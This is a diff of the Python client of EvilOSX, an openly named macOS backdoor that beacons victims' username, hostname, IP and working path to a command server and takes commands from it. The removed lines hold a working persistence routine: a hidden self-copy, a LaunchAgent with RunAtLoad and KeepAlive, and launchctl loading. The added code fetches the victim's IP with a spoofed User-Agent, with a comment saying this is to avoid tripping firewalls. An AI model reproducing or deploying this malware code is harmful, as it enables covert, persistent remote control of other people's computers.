@@ -4,7 +4,7 @@
 # Random Hash: This text will be replaced when building EvilOSX.
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "1.1.1"
+__version__ = "2.1.1"
 
 import time
 import urllib2
@@ -25,9 +25,8 @@ import logging
 
 SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 1337
-DEVELOPMENT = True
-LAUNCH_AGENT_NAME = "com.apple.EvilOSX"
-DISABLE_PERSISTENCE = False
+PROGRAM_DIRECTORY = os.path.expanduser("")  # The program directory where EvilOSX lives (stores files).
+LOADER_OPTIONS = json.loads("")  # Loader options, used to remove/update this payload later.
 
 COMMAND_INTERVAL = 0.5  # Interval in seconds to check for commands.
 IDLE_TIME = 60  # Time in seconds after which the client will become idle.
@@ -50,16 +49,12 @@ def receive_command():
 
     username = run_command("whoami")
     hostname = run_command("hostname")
-    remote_ip = run_command("curl -s https://icanhazip.com/ --connect-timeout 3")
     current_path = run_command("pwd")
-
-    if remote_ip == "":
-        remote_ip = "Unknown"
 
     # Send the server some basic information about this client.
     data = urllib.urlencode(
         {"client_id": get_uid(), "username": username, "hostname": hostname,
-         "remote_ip": remote_ip, "path": current_path}
+         "remote_ip": get_remote_ip(), "path": current_path, "loader": LOADER_OPTIONS["loader_name"]}
     )
 
     # Don't check the hostname when validating the CA.
@@ -128,6 +123,22 @@ def get_uid():
     # The client must be connected to WiFi anyway, so getnode is fine.
     # See https://docs.python.org/2/library/uuid.html#uuid.getnode
     return getpass.getuser() + "-" + str(uuid.getnode())
+
+
+def get_remote_ip():
+    """:return The client's remote IP address."""
+    try:
+        # Using curl triggers firewalls, hopefully this doesn't?
+        # It's always safer to just disable fetching remote IPs.
+        request_path = "https://icanhazip.com/"
+        headers = {"User-Agent": _get_random_user_agent()}
+
+        request = urllib2.Request(url=request_path, headers=headers)
+        response = urllib2.urlopen(request, timeout=3)
+
+        return response.read().replace("\n", "")
+    except Exception:
+        return "Unknown"
 
 
 def _get_random_user_agent():
@@ -268,88 +279,12 @@ def send_response(response, module_name=""):
     urllib2.urlopen(request, cafile=get_ca_file())
 
 
-def setup_persistence():
-    """Makes EvilOSX persist system reboots."""
-    run_command("mkdir -p %s" % get_program_directory())
-    run_command("mkdir -p %s" % get_launch_agent_directory())
-
-    # Create launch agent
-    log.debug("Creating launch agent...")
-
-    launch_agent_create = """\
-        <?xml version="1.0" encoding="UTF-8"?>
-        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-        <plist version="1.0">
-        <dict>
-            <key>KeepAlive</key>
-            <true/>
-            <key>Label</key>
-            <string>%s</string>
-            <key>ProgramArguments</key>
-            <array>
-                <string>%s</string>
-            </array>
-            <key>RunAtLoad</key>
-            <true/>
-        </dict>
-        </plist>
-        """ % (LAUNCH_AGENT_NAME, get_program_file())
-
-    with open(get_launch_agent_file(), "w") as open_file:
-        open_file.write(launch_agent_create)
-
-    # Move EvilOSX
-    log.debug("Moving EvilOSX...")
-
-    if DEVELOPMENT:
-        with open(__file__, "rb") as input_file, open(get_program_file(), "wb") as output_file:
-            output_file.write(input_file.read())
-    else:
-        os.rename(__file__, get_program_file())
-    os.chmod(get_program_file(), 0777)
-
-    # Load launch agent
-    log.debug("Loading launch agent...")
-
-    output = run_command("launchctl load -w %s" % get_launch_agent_file())
-
-    if output == "":
-        if run_command("launchctl list | grep -w %s" % LAUNCH_AGENT_NAME):
-            log.debug("Done!")
-            sys.exit(0)
-        else:
-            log.error("Failed to load launch agent.")
-    elif "already loaded" in output.lower():
-        log.error("EvilOSX is already loaded.")
-        sys.exit(0)
-    else:
-        log.error("Unexpected output: %s", output)
-        pass
-
-
-def get_program_directory():
-    """:return The program directory where EvilOSX lives."""
-    return os.path.expanduser("~/Library/Containers/.EvilOSX")
-
-
-def get_program_file():
-    """:return The path to the EvilOSX file."""
-    return get_program_directory() + "/EvilOSX"
-
-
-def get_launch_agent_directory():
-    """:return The directory where the launch agent lives."""
-    return os.path.expanduser("~/Library/LaunchAgents")
-
-
-def get_launch_agent_file():
-    """:return The path to the launch agent."""
-    return get_launch_agent_directory() + "/%s.plist" % LAUNCH_AGENT_NAME
-
-
 def get_ca_file():
     """:return The path to the server certificate authority file."""
-    ca_file = get_program_directory() + "/server.cert"
+    ca_file = PROGRAM_DIRECTORY + "/server.cert"
+
+    if not os.path.exists(PROGRAM_DIRECTORY):
+        os.mkdir(PROGRAM_DIRECTORY)
 
     if not os.path.exists(ca_file):
         # Ignore the CA only for this request!
@@ -359,8 +294,7 @@ def get_ca_file():
 
         request = urllib2.Request(url="https://%s:%s/api/get_ca" % (SERVER_HOST, SERVER_PORT))
         response = urllib2.urlopen(request, context=request_context)
-        
-        run_command("mkdir -p %s" % get_program_directory())
+
         with open(ca_file, "w") as input_file:
             input_file.write(base64.b64decode(str(response.readline())))
         return ca_file
@@ -373,11 +307,6 @@ def main():
     last_active = time.time()  # The last time a command was requested from the server.
     idle = False
     tasks = []  # List of tuples containing the task name and thread.
-
-    if os.path.dirname(os.path.realpath(__file__)).lower() != get_program_directory().lower():
-        if not DEVELOPMENT and not DISABLE_PERSISTENCE:
-            # Setup persistence.
-            setup_persistence()
 
     while True:
         try:
@@ -450,7 +379,7 @@ def main():
                 # Invalid certificate authority.
                 log.error("Error: %s", str(ex))
                 log.error("Invalid certificate authority, removing...")
-                os.remove(get_program_directory() + "/server.cert")
+                os.remove(PROGRAM_DIRECTORY + "/server.cert")
             else:
                 log.error(traceback.format_exc())
                 time.sleep(5)
